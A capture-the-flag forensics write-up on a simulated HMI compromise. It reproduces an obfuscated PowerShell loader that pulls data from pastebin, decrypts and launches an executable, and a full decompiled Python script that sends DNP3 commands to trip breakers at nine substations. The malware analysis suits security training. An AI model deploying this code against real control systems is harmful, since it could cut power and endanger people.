---
title: "CSAW 2021: Tripping Breakers"
summary: "Attached is a forensics capture of an HMI (human machine interface) containing scheduled tasks, registry hives, and user profile of an operator account."
date: 2021-09-12
categories:
  - "writeups"
tags:
  - "forensics"
  - "ics"
---

**Category:** ICS  
**Points:** 481  
**Provided:**  

- [hmi_host_data.zip](https://github.com/starfleetcadet75/writeups/blob/master/2021-CSAW/tripping-breakers/hmi_host_data.zip?raw=true)

## Challenge

> Attached is a forensics capture of an HMI (human machine interface) containing scheduled tasks, registry hives, and user profile of an operator account.
> There is a scheduled task that executed in April 2021 that tripped various breakers by sending DNP3 messages.
> We would like your help clarifying some information.
> What was the IP address of the substation_c, and how many total breakers were tripped by this scheduled task? Flag format: flag{IP-Address:# of breakers}.
> For example if substation_c's IP address was 192.168.1.2 and there were 45 total breakers tripped, the flag would be flag{192.168.1.2:45}.

## Observations

We are given a minimal triage image from a Windows system that includes a CSV listing scheduled task information, the SOFTWARE registry hive as a JSON file, and the contents of the user profile for the "operator" user.

We can open and sort the scheduled tasks by last run time using Timeline Explorer.
The task that stands out is the Powershell script being run from the `%temp%` directory.

![timeline_explorer](https://raw.githubusercontent.com/starfleetcadet75/writeups/master/2021-CSAW/tripping-breakers/timeline_explorer.png)

## Solution

Fortunately for this investigation, the Powershell script can still be found in the provided user directory.
The script uses base64 to obfuscate two registry keys that it pulls values from.

We can search the provided SOFTWARE registry hive to locate both keys.
The first value is a password and the second is the path to a text file, which is also provided with the triage image.

```powershell
# Decodes to "HKLM:\SOFTWARE\Microsoft\Windows\TabletPC\Bell"
$SCOP = ((new-object System.Net.WebClient).DownloadString("https://pastebin.com/raw/rBXHdE85")).Replace("!","f").Replace("@","q").Replace("#","z").Replace("<","B").Replace("%","K").Replace("^","O").Replace("&","T").Replace("*","Y").Replace("[","4").Replace("]","9").Replace("{","=");
$SLPH = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64 String($SCOP));

# Reads the string "M4RK_MY_W0Rd5" from the registry key "Blast"
$E = (Get-ItemProperty -Path $SLPH -Name Blast)."Blast";

# Decodes to "HKLM:\SOFTWARE\Microsoft\Wbem\Tower"
$TWR = "!M[[pcU09%d^kV&l#9*0XFd]cVG93<".Replace("!","SEt").Replace("@","q").Replace("#","jcm").Replace("<","ZXI=").Replace("%","GVF").Replace("^","BU").Replace("&","cTW").Replace("*","zb2Z").Replace("[","T").Replace("]","iZW1").Replace("{","Fdi");
$BRN = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($TWR));

# Reads the string "\EOTW\151.txt" from the registry key "Off"
$D = (Get-ItemProperty -Path $BRN -Name Off)."Off";

# Decrypt the contents of 151.txt and save them as fate.exe
openssl aes-256-cbc -a -A -d -salt -md sha256 -in $env:temp$D -pass pass:$E -out "c:\1\fate.exe";
C:\1\fate.exe;
```

We can directly run the openssl command ourselves using the deobfuscated arguments to recover the [fate.exe](https://github.com/starfleetcadet75/writeups/blob/master/2021-CSAW/tripping-breakers/fate.exe?raw=true) program.

```none
$ file 151.txt
151.txt: openssl enc'd data with salted password, base64 encoded
$ openssl aes-256-cbc -a -A -d -salt -md sha256 -in 151.txt -pass pass:"M4RK_MY_W0Rd5" -out fate.exe
*** WARNING : deprecated key derivation used.
Using -iter or -pbkdf2 would be better.
$ file fate.exe 
fate.exe: PE32+ executable (console) x86-64, for MS Windows
```

We can quickly determine from the strings that this program is actually just a Python script bundled with PyInstaller.

```none
$ strings -n15 fate.exe
PyUnicode_AsUTF8
Failed to get address for PyUnicode_AsUTF8
Error loading Python DLL '%s'.
Error detected starting Python VM.
Failed to get _MEIPASS as PyObject.
PyInstaller: FormatMessageW failed.
PyInstaller: pyi_win32_utils_to_utf8 failed.
```

We can use [pyinstxtractor](https://github.com/extremecoders-re/pyinstxtractor) to extract the Python script and then decompile the outputted pyc file using [uncompyle6](https://pypi.org/project/uncompyle6/).

```none
python3.6 pyinstxtractor.py fate.exe
uncompyle6 fate.exe_extracted/trip_breakers.pyc
```

Each Python version can [introduce slight changes](https://github.com/NationalSecurityAgency/ghidra/issues/1165#issuecomment-546714347) to the way that the marshalling and bytecode work.
In order to completely recover the [full Python script](https://github.com/starfleetcadet75/writeups/blob/master/2021-CSAW/tripping-breakers/trip_breakers.py?raw=true), we must run both tools explicitly using Python 3.6.
This can be done in a virtual environment using pyenv to avoid messing with the system default.

```python
# uncompyle6 version 3.7.4
# Python bytecode 3.6 (3379)
# Decompiled from: Python 3.6.0 (default, Sep 12 2021, 07:24:49) 
# [GCC 10.3.0]
# Embedded file name: trip_breakers.py
import struct, socket, time, sys
from crccheck.crc import Crc16Dnp

OPT_1 = 3
OPT_2 = 4
OPT_3 = 66
OPT_4 = 129

class Substation:
    def __init__(self, ip_address, devices):
        self.target = ip_address
        self.devices = []
        self.src = 50
        self.transport_seq = 0
        self.app_seq = 10

        for device in devices:
            self.add_device(device)

        self.connect()

    def connect(self):
        print('Connecting to {}...'.format(self.target))
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.socket.connect((self.target, 20000))
        print('Connected to {}'.format(self.target))

    def add_device(self, device):
        self.devices.append({'dst':device[0],  'count':device[1]})

    def activate_all_breakers(self, code):
        for device in self.devices:
            dnp3_header = self.get_dnp3_header(device['dst'])
            for x in range(1, device['count'] * 2, 2):
                dnp3_packet = dnp3_header + self.get_dnp3_data(x, OPT_1, code)
                self.socket.send(dnp3_packet)
                time.sleep(2)
                dnp3_packet = dnp3_header + self.get_dnp3_data(x, OPT_2, code)
                self.socket.send(dnp3_packet)
                time.sleep(5)

    def get_dnp3_header(self, dst):
        data = struct.pack('<H2B2H', 25605, 24, 196, dst, self.src)
        data += struct.pack('<H', Crc16Dnp.calc(data))
        return data

    def get_dnp3_data(self, index, function, code):
        data = struct.pack('<10BIH', 192 + self.transport_seq, 192 + self.app_seq, function, 12, 1, 23, 1, index, code, 1, 500, 0)
        data += struct.pack('<H', Crc16Dnp.calc(data))
        data += struct.pack('<HBH', 0, 0, 65535)
        self.transport_seq += 1
        self.app_seq += 1
        if self.transport_seq >= 62:
            self.transport_seq = 0
        if self.app_seq >= 62:
            self.app_seq = 0
        return data

def main():
    if socket.gethostname() != 'hmi':
        sys.exit(1)

    substation_a = Substation('10.95.101.80', [(2, 4), (19, 8)])
    substation_b = Substation('10.95.101.81', [(9, 5), (8, 7), (20, 12), (15, 19)])
    substation_c = Substation('10.95.101.82', [(14, 14), (9, 16), (15, 4), (12, 5)])
    substation_d = Substation('10.95.101.83', [(20, 17), (16, 8), (8, 14)])
    substation_e = Substation('10.95.101.84', [(12, 4), (13, 5), (4, 2), (11, 9)])
    substation_f = Substation('10.95.101.85', [(1, 4), (3, 9)])
    substation_g = Substation('10.95.101.86', [(10, 14), (20, 7), (27, 4)])
    substation_h = Substation('10.95.101.87', [(4, 1), (10, 9), (13, 6), (5, 21)])
    substation_i = Substation('10.95.101.88', [(14, 13), (19, 2), (8, 6), (17, 8)])

    substation_a.activate_all_breakers(OPT_3)
    substation_b.activate_all_breakers(OPT_4)
    substation_c.activate_all_breakers(OPT_4)
    substation_d.activate_all_breakers(OPT_4)
    substation_e.activate_all_breakers(OPT_3)
    substation_f.activate_all_breakers(OPT_4)
    substation_g.activate_all_breakers(OPT_3)
    substation_h.activate_all_breakers(OPT_4)
    substation_i.activate_all_breakers(OPT_4)

if __name__ == '__main__':
    main()
# okay decompiling fate.exe_extracted/trip_breakers.pyc
```

The script shows that substation_c's IP address is 10.95.101.82.
The list passed as the second argument to the `Substation` class is used to provide the destination address and count of each device connected to that substation.
The second element inside each tuple provides the count of devices that we need to use.
Adding all of the values together incorrectly shows 257 devices.

The question is asking us how many breakers were actually tripped.
Since we have established that substation_c had its breaker's tripped, we can assume that each substation that received a packet using `OPT_4` was tripped.
Adding only the values from these substations yields the correct answer of 200 total breakers.

**Flag:** `flag{10.95.101.82:200}`
